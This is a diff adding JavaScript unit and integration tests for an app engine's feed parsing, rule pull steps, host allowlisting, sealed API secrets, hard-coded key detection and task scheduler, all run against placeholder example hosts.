+  assert.deepEqual([a.title, a.link, a.guid, a.published, a.updated, a.summary, a.content, a.author, a.categories], ['Hello & welcome', 'https://blog.example.com/hello', 'tag:blog.example.com,2026:1', '2026-11-10T09:00:00.000Z', '2026-11-11T10:00:00.000Z', 'Short', 'Long text', 'Bo', 'intro']);
+  const rdf = '<rdf:RDF><channel><items><rdf:Seq><rdf:li resource="https://x.example/1"/></rdf:Seq></items></channel><item><title>One</title><link>https://x.example/1</link><dc:date>2026-11-01</dc:date></item></rdf:RDF>';
+  assert.deepEqual(parseFeed(rdf).map((i) => [i.title, i.link, i.published]), [['One', 'https://x.example/1', '2026-11-01T00:00:00.000Z']]);
+  assert.throws(() => parseFeed('<html><body>not a feed</body></html>'), /not an RSS or Atom feed/);
+  assert.deepEqual(jsonItems({ data: { items: [{ a: 1 }, 2, { a: 3 }] } }, 'data.items'), [{ a: 1 }, { a: 3 }]);
+  assert.deepEqual(jsonItems([{ a: 1 }]), [{ a: 1 }]);
+  assert.deepEqual(jsonItems({ meta: {}, results: [{ a: 1 }] }), [{ a: 1 }], 'the first list of objects when no path is given');
+  assert.throws(() => jsonItems({ data: 1 }, 'data'), /nothing at data is a list/);
+  assert.equal(at({ value: { mid: 1.1 } }, 'value.mid'), 1.1);
+});
+
+test('a PULL step adds each new item once, through app.fetch, and is checked against the table', async () => {
+  const rss = '<rss><channel><item><title>A</title><link>https://n.example/a</link></item><item><title>B</title><link>https://n.example/b</link></item><item><title>B again</title><link>https://n.example/b</link></item><item><title>C</title><link>https://n.example/c</link></item></channel></rss>';
+  const inserted = [];
+  const fetched = [];
+  const host = async (m, args) => {
+    if (m === 'fetch') { fetched.push(args); return { ok: true, status: 200, url: args[0], type: 'application/rss+xml', text: rss }; }
+    if (m === 'sql') return /:_pullkey/.test(args[0]) && args[1]._pullkey === 'https://n.example/a' ? [{ id: 'r1' }] : [];
+    if (m === 'insert') { inserted.push(args); return { id: `n${inserted.length}`, ...args[1] }; }
+    throw new Error(`no ${m}`);
+  };
+  const rule = { steps: [{ pull: { from: 'feed', url: 'https://n.example/rss', into: 'stories', cols: { headline: 'title', link: 'link' }, key: 'link', secret: 'news' }, as: 'got' }, { return: ':got.added' }] };
+  assert.equal(await runRule(rule, {}, host), 2, 'a is there already, b comes twice');
+  assert.deepEqual(inserted.map((x) => x[1]), [{ headline: 'B', link: 'https://n.example/b' }, { headline: 'C', link: 'https://n.example/c' }]);
+  assert.deepEqual(fetched[0], ['https://n.example/rss', { fresh: true, secret: 'news' }]);
+  // a build's tests reach nothing: the pull adds nothing
+  const quiet = async (m) => (m === 'fetch' ? { ok: false, status: 0 } : []);
+  assert.deepEqual(await runRule({ steps: [{ pull: rule.steps[0].pull, as: 'got' }, { return: ':got.added' }] }, {}, quiet), 0);
+  // an answer that is not a feed, or an error, is the rule's failure
+  await assert.rejects(runRule(rule, {}, async (m) => (m === 'fetch' ? { ok: true, status: 200, type: 'text/html', body: '<html></html>' } : [])), /not an RSS or Atom feed/);
+  await assert.rejects(runRule(rule, {}, async (m) => (m === 'fetch' ? { ok: false, status: 503 } : [])), /answered 503/);
+  // JSON by path
+  const json = { steps: [{ pull: { from: 'json', url: 'https://api.example.com/r', at: 'data', into: 'rates', cols: { currency: 'code', rate: 'v.mid' }, key: 'currency' } }] };
+  const rows = [];
+  await runRule(json, {}, async (m, args) => (m === 'fetch' ? { ok: true, status: 200, json: { data: [{ code: 'EUR', v: { mid: 1.1 } }, { code: 'GBP', v: { mid: 1.3 } }] } } : m === 'insert' ? rows.push(args[1]) : []));
+  assert.deepEqual(rows, [{ currency: 'EUR', rate: 1.1 }, { currency: 'GBP', rate: 1.3 }]);
+  const cols = (t) => (t === 'stories' ? new Set(['headline', 'link']) : null);
+  assert.deepEqual(checkRule(rule, cols), []);
+  assert.match(checkRule({ steps: [{ pull: { ...rule.steps[0].pull, cols: { body: 'content', link: 'link' } } }] }, cols).join(), /body is not a column of stories/);
+  assert.match(checkRule({ steps: [{ pull: { ...rule.steps[0].pull, into: 'nope' } }] }, cols).join(), /no table "nope"/);
+  assert.match(checkRule({ steps: [{ pull: { ...rule.steps[0].pull, url: 'ftp://x' } }] }, cols).join(), /an http or https address/);
+});
+
+test('hosts: an app reads only from hosts its owner allowed, sends only to those marked, and a redirect elsewhere is refused', async () => {
+  const { Reach, fetchPublic, usesOf, cleanHost } = await import('../engine/reach.mjs');
+  const settings = new Map();
+  const store = { setting: async (a, n) => settings.get(`${a}:${n}`) ?? null, putSetting: async (a, n, v) => { settings.set(`${a}:${n}`, String(v)); } };
+  const seen = [];
+  const pages = {
+    'https://www.example.com/a': { status: 200, headers: { 'content-type': 'application/json' }, body: Buffer.from('{"ok": 1}') },
+    'https://example.com/away': { status: 302, headers: { location: 'https://elsewhere.example.org/x' }, body: Buffer.from('') },
+    'https://example.com/post': { status: 200, headers: { 'content-type': 'application/json' }, body: Buffer.from('{"sent": true}') },
+  };
+  const requestFn = async (u, o) => { seen.push({ url: u.href, method: o.method, headers: o.headers }); return pages[u.href] || { status: 404, headers: {}, body: Buffer.from('') }; };
+  const reach = new Reach({ store, fetchFn: (url, opts, extra) => fetchPublic(url, opts, { ...extra, requestFn }) });
+  await reach.setSwitches('a1', { fetch: true });
+  await assert.rejects(reach.fetch('a1', 'https://www.example.com/a'), (e) => e.refused && e.off === 'host' && /www\.example\.com is not among the hosts this app may read from/.test(e.message));
+  assert.deepEqual(Object.keys(await reach.asked('a1')), ['www.example.com'], 'the refused host waits for the owner');
+  await reach.setSwitches('a1', { allow: 'https://example.com/' });
+  assert.deepEqual((await reach.switches('a1')).hosts, [{ host: 'example.com', send: false }]);
+  assert.deepEqual(await reach.asked('a1'), {}, 'allowing it clears the request');
+  assert.deepEqual((await reach.fetch('a1', 'https://www.example.com/a')).json, { ok: 1 }, 'a host covers its subdomains');
+  await assert.rejects(reach.fetch('a1', 'https://example.com/post', { method: 'POST', json: { x: 1 } }), /may send to/);
+  assert.equal((await reach.asked('a1'))['example.com'].send, true);
+  await reach.setSwitches('a1', { allow: { host: 'example.com', send: true } });
+  assert.deepEqual((await reach.fetch('a1', 'https://example.com/post', { method: 'POST', json: { x: 1 } })).json, { sent: true });
+  await assert.rejects(reach.fetch('a1', 'https://example.com/away'), /sent it on to elsewhere\.example\.org/);
+  assert.ok((await reach.asked('a1'))['elsewhere.example.org']);
+  assert.ok(!seen.some((r) => r.url.startsWith('https://elsewhere')), 'the refused hop is never requested');
+  await reach.setSwitches('a1', { forget: 'example.com' });
+  await assert.rejects(reach.fetch('a1', 'https://example.com/post', { method: 'POST', json: { x: 2 } }), /may send to/);
+  // switched on before host lists: any public host, as before
+  settings.set('old:reach', JSON.stringify({ fetch: true }));
+  assert.deepEqual((await reach.switches('old')).hosts, [{ host: '*', send: true }]);
+  assert.deepEqual((await reach.fetch('old', 'https://www.example.com/a', { fresh: true })).json, { ok: 1 });
+  for (const bad of ['localhost', '10.0.0.1', 'printer.local', 'intranet', '*.local', 'a b']) assert.throws(() => cleanHost(bad), /not a host on the public internet/, bad);
+  assert.equal(cleanHost('*.Example.COM.'), 'example.com');
+  // what the code names
+  const view = {
+    views: [{ code: "const r = await app.fetch('https://api.weather.example/v1?q=' + city, {secret: 'weather'}); h('a', {href: 'https://docs.example.net/'})" }],
+    functions: [{ code: "function run(i, app) { return app.fetch('https://hooks.example.com/x', {method: 'POST', json: i}); }", spec: {} },
+      { code: JSON.stringify({ steps: [{ pull: { from: 'feed', url: 'https://news.example.com/rss', into: 's', cols: { title: 'title' }, key: 'title', secret: 'news' } }] }), spec: { rule: true, every: { unit: 'hour', n: 1 } } }],
+  };
+  const u = usesOf(view);
+  assert.deepEqual(u.hosts, ['api.weather.example', 'hooks.example.com', 'news.example.com'], 'a link in a view is not a host it reaches');
+  assert.equal(u.sends, true);
+  assert.deepEqual(u.secrets, ['news', 'weather']);
+  assert.equal(u.schedule, true);
+  assert.equal(u.fetch, true);
+  await reach.setSwitches('w1', { fetch: true, allow: 'news.example.com' });
+  assert.deepEqual(await reach.wants('w1', view), { switches: ['schedule'], hosts: ['api.weather.example', 'hooks.example.com'], secrets: ['news', 'weather'] });
+});
+
+test('secrets: sealed, sent only to their hosts (in a header or a parameter), dropped on a redirect elsewhere, and never given back', async () => {
+  const { Reach, fetchPublic } = await import('../engine/reach.mjs');
+  const settings = new Map();
+  const store = { setting: async (a, n) => settings.get(`${a}:${n}`) ?? null, putSetting: async (a, n, v) => { settings.set(`${a}:${n}`, String(v)); } };
+  const KEY = 'k3y-0123456789-abcdef';
+  const seen = [];
+  const requestFn = async (u, o) => {
+    seen.push({ url: u.href, auth: o.headers.authorization, apikey: o.headers['x-api-key'] });
+    if (u.pathname === '/echo') return { status: 200, headers: { 'content-type': 'application/json' }, body: Buffer.from(JSON.stringify({ you_sent: o.headers.authorization || u.searchParams.get('key') })) };
+    if (u.pathname === '/hop') return { status: 302, headers: { location: 'https://cdn.example.net/file' }, body: Buffer.from('') };
+    return { status: 200, headers: { 'content-type': 'text/plain' }, body: Buffer.from('fine') };
+  };
+  const reach = new Reach({ store, secretKey: 'engine key one', fetchFn: (url, opts, extra) => fetchPublic(url, opts, { ...extra, requestFn }) });
+  await reach.setSwitches('a1', { fetch: true, hosts: ['api.weather.example', 'cdn.example.net', 'other.example'] });
+  await assert.rejects(reach.putSecret('a1', { name: 'weather', value: KEY }), /bind the secret to the hosts/);
+  await assert.rejects(reach.putSecret('a1', { name: 'bad name', value: KEY, hosts: 'api.weather.example' }), /letters, digits/);
+  await assert.rejects(reach.putSecret('a1', { name: 'w', value: KEY, hosts: '*' }), /not to "\*"/);
+  await assert.rejects(reach.fetch('a1', 'https://api.weather.example/echo', { secret: 'weather' }), (e) => e.refused && e.off === 'secret' && /no secret "weather"/.test(e.message));
+  const shown = await reach.putSecret('a1', { name: 'weather', value: KEY, hosts: 'api.weather.example' });
+  assert.deepEqual({ ...shown, created: null }, { name: 'weather', hosts: ['api.weather.example'], header: 'authorization', prefix: 'Bearer ', param: null, created: null, used: null, hint: '…cdef' });
+  assert.ok(!settings.get('a1:secrets').includes(KEY), 'the value is stored sealed');
+  assert.ok(!JSON.stringify(await reach.secrets('a1')).includes(KEY), 'and never listed');
+  const echo = await reach.fetch('a1', 'https://api.weather.example/echo', { secret: 'weather' });
+  assert.equal(seen.at(-1).auth, `Bearer ${KEY}`);
+  assert.deepEqual(echo.json, { you_sent: 'Bearer [secret]' }, 'an answer that echoes it has it replaced');
+  await reach.fetch('a1', 'https://api.weather.example/plain');
+  assert.equal(seen.at(-1).auth, undefined, 'only when the code names it');
+  await assert.rejects(reach.fetch('a1', 'https://other.example/echo', { secret: 'weather' }), /only sent to api\.weather\.example, not to other\.example/);
+  await reach.fetch('a1', 'https://api.weather.example/hop', { secret: 'weather' });
+  assert.deepEqual(seen.slice(-2).map((r) => [r.url, r.auth]), [['https://api.weather.example/hop', `Bearer ${KEY}`], ['https://cdn.example.net/file', undefined]], 'a redirect elsewhere goes without it');
+  // in a header of its own, or a query parameter
+  await reach.putSecret('a1', { name: 'shop', value: 'shopkey-0000111122223333', hosts: ['other.example'], header: 'x-api-key' });
+  await reach.fetch('a1', 'https://other.example/x', { secret: 'shop', fresh: true });
+  assert.deepEqual([seen.at(-1).apikey, seen.at(-1).auth], ['shopkey-0000111122223333', undefined]);
+  await reach.putSecret('a1', { name: 'maps', value: 'mapkey-999988887777', hosts: ['api.weather.example'], param: 'key' });
+  const p = await reach.fetch('a1', 'https://api.weather.example/echo?q=x', { secret: 'maps' });
+  assert.equal(new URL(seen.at(-1).url).searchParams.get('key'), 'mapkey-999988887777');
+  assert.equal(p.url, 'https://api.weather.example/echo?q=x', 'the answer\'s address is the one asked, without the key');
+  assert.deepEqual(p.json, { you_sent: '[secret]' });
+  // the answer to one app is never another app's, nor the same app's with another secret
+  await reach.setSwitches('b2', { fetch: true, hosts: ['api.weather.example'] });
+  const plain = await reach.fetch('b2', 'https://api.weather.example/echo');
+  assert.deepEqual(plain.json, { you_sent: null });
+  // another engine key cannot open it
+  const other = new Reach({ store, secretKey: 'engine key two', fetchFn: (url, opts, extra) => fetchPublic(url, opts, { ...extra, requestFn }) });
+  await assert.rejects(other.fetch('a1', 'https://api.weather.example/echo', { secret: 'weather', fresh: true }), /cannot be read with this engine's key/);
+  assert.equal((await reach.deleteSecret('a1', 'weather')).deleted, true);
+  await assert.rejects(reach.fetch('a1', 'https://api.weather.example/echo', { secret: 'weather' }), /no secret "weather"/);
+});
+
+test('keys and tokens written into code are refused at build time', async () => {
+  const { keysIn } = await import('../engine/forge.mjs');
+  assert.match(keysIn("app.fetch('https://api.example.com/w?q=x&appid=0123456789abcdef0123')").join(), /an API key in an address/);
+  assert.match(keysIn("headers: {authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9.abcdefghijk'}").join(), /a bearer token/);
+  assert.match(keysIn("const k = 'sk-abcdefghijklmnopqrstuvwxyz012345'").join(), /a key/);
+  assert.deepEqual(keysIn("app.fetch(`https://api.example.com/w?q=${q}&key=${k}`, {secret: 'w'})"), []);
+  assert.deepEqual(keysIn("app.fetch('https://api.example.com/w?q=london')"), []);
+});
+
+test('the scheduler runs what is due once its owner switched schedules on, says how it went, and stops after five failures', async () => {
+  const { Scheduler, parseEvery } = await import('../engine/schedule.mjs');
+  const settings = new Map();
+  let now = Date.parse('2026-11-12T10:00:00Z');
+  let fail = false;
+  const calls = [];
+  const fns = [{ slug: 'pull-news', title: 'News', spec: { every: parseEvery('EVERY HOUR'), source: true, rule: true } }, { slug: 'brief', title: 'Brief', spec: { every: parseEvery("EVERY DAY AT '07:00' TZ 'Europe/Madrid'") } }, { slug: 'plain', spec: {} }];
+  const store = {
+    setting: async (a, n) => settings.get(`${a}:${n}`) ?? null,
+    putSetting: async (a, n, v) => { settings.set(`${a}:${n}`, String(v)); },
+    listApps: async () => [{ id: 'a1', head: 2 }, { id: 'empty', head: 0 }],
+    resolve: async () => ({ functions: fns }),
+  };
+  const engine = { store, call: async (app, slug, input, ctx) => { calls.push([slug, input, ctx.who]); if (fail) throw new Error('feed down'); return { result: { added: 3 } }; } };
+  let on = false;
+  const reach = { switches: async () => ({ schedule: on }) };
+  const s = new Scheduler({ engine, reach, now: () => now });
+  await s.tick();
+  assert.equal(calls.length, 0, 'nothing runs until the owner switches schedules on');
+  on = true;
+  await s.tick();
+  assert.deepEqual(calls, [['pull-news', { today: '2026-11-12' }, 'schedule']], 'an hourly one runs at once; the daily one waits for 07:00 in Madrid');
+  let list = await s.list('a1');
+  assert.deepEqual(list.map((x) => [x.slug, x.when, x.status, x.result, x.next && new Date(x.next).toISOString()]),
+    [['pull-news', 'every hour', 'ok', '{"added":3}', '2026-11-12T11:00:00.000Z'], ['brief', 'every day at 07:00 (Europe/Madrid)', 'never run', null, '2026-11-13T06:00:00.000Z']]);
+  now += 30 * 60_000;
+  await s.tick();
+  assert.equal(calls.length, 1, 'not again within the hour');
+  now = Date.parse('2026-11-13T06:00:30Z');
+  await s.tick();
+  assert.deepEqual(calls.slice(1).map((c) => c[0]).sort(), ['brief', 'pull-news'], 'away for a night: each runs once, not once per missed hour');
+  assert.equal(calls.find((c) => c[0] === 'brief')[1].today, '2026-11-13', 'today is the day in its time zone');
+  fail = true;
+  for (let i = 0; i < 5; i++) { now += 3_600_000; await s.tick(); }
+  list = await s.list('a1');
+  const news = list.find((x) => x.slug === 'pull-news');
+  assert.deepEqual([news.status, news.failures, news.paused, news.error], ['failed', 5, true, 'feed down']);
+  const before = calls.length;
+  now += 3_600_000;
+  await s.tick();
+  assert.equal(calls.filter((c, i) => i >= before && c[0] === 'pull-news').length, 0, 'stopped after five failures in a row');
+  fail = false;
+  await s.setPaused('a1', 'pull-news', false);
+  await s.runNow('a1', 'pull-news');
+  assert.deepEqual(calls.at(-1), ['pull-news', { today: calls.at(-1)[1].today }, 'owner']);
+  assert.equal((await s.list('a1')).find((x) => x.slug === 'pull-news').status, 'ok');
+  await assert.rejects(s.runNow('a1', 'plain'), /no scheduled rule or function plain/);
+});
+
+test('a source on a schedule fills a table in Strata once per item, through the hosts its owner allowed', async (t) => {
+  const { findServerBinary, startServer } = await import('../engine/strata.mjs');
+  const { Engine } = await import('../engine/engine.mjs');
+  const { Reach } = await import('../engine/reach.mjs');
+  const { Scheduler } = await import('../engine/schedule.mjs');
+  const { compileRule } = await import('../engine/rulesql.mjs');
+  const bin = findServerBinary(join(import.meta.dirname, '..', '..'));
+  if (!bin) return noServer(t);
+  const dir = mkdtempSync(join(tmpdir(), 'sa-src-'));
+  const port = await new Promise((r) => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
+  const { child, client } = await startServer({ bin, db: join(dir, 'apps.strata'), listen: `127.0.0.1:${port}`, log: () => {} });
+  try {
+    const engine = new Engine(client, { log: () => {} });
+    await engine.store.init(); // (without following the feed of changes, which would keep the test running)
+    const store = engine.store;
+    const app = { id: await store.createApp({ name: 'News' }) };
+    const table = { name: 'stories', columns: [{ name: 'title', type: 'text' }, { name: 'link', type: 'keyword' }, { name: 'published', type: 'timestamp' }, { name: 'summary', type: 'text' }] };
+    await store.ensureTable(app.id, table, new Set());
+    const tableId = await store.putCapability({ app: app.id, slug: 'stories', kind: 'table', title: 'stories', spec: table, code: '' });
+    const src = "CREATE SOURCE news FROM FEED 'https://news.example.com/rss' EVERY 1 HOUR INTO stories (title, link, published, summary) KEY link";
+    const out = compileRule(src);
+    const fnId = await store.putCapability({ app: app.id, slug: 'news', kind: 'function', title: 'News', code: JSON.stringify(out.rule), spec: { on: null, every: out.every, source: true, rule: true, statement: src } });
+    await store.writeComposition(app.id, [tableId, fnId], 'test', 'a source');
+    const [row] = await client.get('sa_capabilities', [fnId]);
+    assert.equal(row.code, src, 'stored as the statement');
+    const item = (n) => `<item><title>Story ${n}</title><link>https://news.example.com/${n}</link><pubDate>Thu, 12 Nov 2026 0${n}:00:00 GMT</pubDate><description>&lt;p&gt;About ${n}&lt;/p&gt;</description></item>`;
+    let feed = `<rss><channel>${item(1)}${item(2)}</channel></rss>`;
+    const fetched = [];
+    const reach = new Reach({ store, fetchFn: async (url) => { fetched.push(url); return { ok: true, status: 200, url, type: 'application/rss+xml', text: feed }; } });
+    engine.reach = reach;
+    let now = Date.parse('2026-11-12T10:00:00Z');
+    const s = new Scheduler({ engine, reach, now: () => now });
+    await reach.setSwitches(app.id, { fetch: true, schedule: true });
+    await s.tick();
+    let [st] = await s.list(app.id);
+    assert.equal(st.status, 'refused', 'no host allowed yet');
+    assert.match(st.error, /news\.example\.com is not among the hosts/);
+    assert.ok((await reach.asked(app.id))['news.example.com']);
+    await reach.setSwitches(app.id, { allow: 'news.example.com' });
+    now += 3_600_000;
+    await s.tick();
+    await engine.settle();
+    const rows = async () => engine.sql(app.id, 'SELECT title, link, published, summary FROM stories ORDER BY link');
+    assert.deepEqual(await rows(), [
+      { title: 'Story 1', link: 'https://news.example.com/1', published: '2026-11-12T01:00:00Z', summary: 'About 1' },
+      { title: 'Story 2', link: 'https://news.example.com/2', published: '2026-11-12T02:00:00Z', summary: 'About 2' },
+    ], 'rows as the feed gave them');
+    feed = `<rss><channel>${item(3)}${item(2)}${item(1)}</channel></rss>`;
+    now += 3_600_000;
+    await s.tick();
+    await engine.settle();
+    assert.deepEqual((await rows()).map((r) => r.title), ['Story 1', 'Story 2', 'Story 3'], 'each item once');
+    [st] = await s.list(app.id);
+    assert.equal(st.status, 'ok');
+    assert.equal(st.runs, 3);
+    assert.equal(fetched.length, 2);
+  } finally {
+    child.kill();
   }
 });
